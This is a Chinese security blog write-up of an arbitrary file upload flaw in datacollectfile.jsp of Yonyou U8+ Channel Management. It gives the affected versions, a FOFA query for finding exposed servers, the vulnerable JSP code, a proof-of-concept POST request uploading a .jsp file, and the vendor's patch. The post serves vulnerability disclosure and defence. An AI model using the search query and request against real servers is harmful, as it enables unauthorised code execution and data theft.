---
title: "用友U8+渠道管理(高级版) datacollectfile.jsp 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-business-common-view-datacollectfile-upload-rce.html
asset_dir: assets/用友u8+渠道管理(高级版)-datacollectfile.jsp-文件上传漏洞
---

# 用友U8+渠道管理(高级版) datacollectfile.jsp 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/15 10:10
- 859浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

JSON处理工具

安全工具开发

授权

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友公司推出的企业管理[软件](#)套件，广泛应用于财务、供应链、人力资源等多个业务领域。在U8+渠道管理（高级版）模块中，存在一处[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，位于其 `datacollectfile.jsp` 文件中。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

漏洞预警服务

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

根据补丁变化

[![用友U8+渠道管理(高级版) datacollectfile.jsp 文件上传漏洞](images/img-001-c6cc2afa0b6d.webp)](https://image.mrxn.net/7673d86abb2d4c08b55ae49d7ce1f020.webp)

直接看 `datacollectfile.jsp` 文件里有关文件处理的实现逻辑

物流软件安全

深入探索

漏洞扫描服务

漏洞扫描器

安全认证考试

```
<%
        com.gxfcsoft.framework.base.util.UserState us = com.gxfcsoft.framework.action.users.UserManager.getUserBySessionId(session.getId());

        String month = "";
        String affix = "";
        String fileFullName = "";
        if(ServletFileUpload.isMultipartContent(request)){
          ServletFileUpload upload = new ServletFileUpload(new DiskFileItemFactory());
          upload.setHeaderEncoding("UTF-8");
          java.util.List<FileItem> fileItems = upload.parseRequest(request);
          for(FileItem fileItem : fileItems){
            if(fileItem.isFormField()){
              String fieldname = fileItem.getFieldName();
              if("month".equals(fieldname)){
                      month = fileItem.getString("UTF-8");  
              }
            }else{
              affix = fileItem.getName();
              String path = com.gxfcsoft.framework.base.util.PathUtil.getUserFile()+"temp"+java.io.File.separator;
              String fieldID = com.gxfcsoft.framework.base.util.UUID.getID();
                    if(affix.indexOf(".")!=-1)
                            fieldID +=affix.substring(affix.lastIndexOf("."));
                    fileFullName = path+fieldID;
                    java.io.File saveFilepath=new java.io.File(fileFullName);
                    fileItem.write(saveFilepath);
            }
          }
        }
        %>
```

深入探索

Web安全课程

安全

VPN服务

文件后缀从上传文件名中获取，然后拼接到uuid后面形成新的文件名，期间对文件类型和内容无校验或过滤，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，非常朴实无华！和[U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞](https://mrxn.net/jswz/yonyou-business-ums-sendmail-upload-rce.html) 差不多的漏洞原因。

漏洞预警服务

# 漏洞复现

```
POST /business/common/view/datacollectfile.jsp HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycIJMmIz8L5Q1Q8M6

------WebKitFormBoundarycIJMmIz8L5Q1Q8M6
Content-Disposition: form-data; name="file"; filename="1.jsp"

UPLOAD_TEST
------WebKitFormBoundarycIJMmIz8L5Q1Q8M6--
```

在响应里成功回显上传文件的完整路径，直接访问访问上传文件

[![用友U8+渠道管理(高级版) datacollectfile.jsp 文件上传漏洞](images/img-002-bc14d112831e.webp)](https://image.mrxn.net/c29b5a73adee47738729aec96a2c8536.webp)

成功[执行](https://mrxn.net/tag/rce)我们上传代码

官方补丁修复也很直接，直接正则检测后缀是否为白名单

[![用友U8+渠道管理(高级版) datacollectfile.jsp 文件上传漏洞](images/img-003-350ddb6efb8a.webp)](https://image.mrxn.net/58f0b4776d1b4fc2afe8d15545b00bbb.webp)

# 参考

- [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
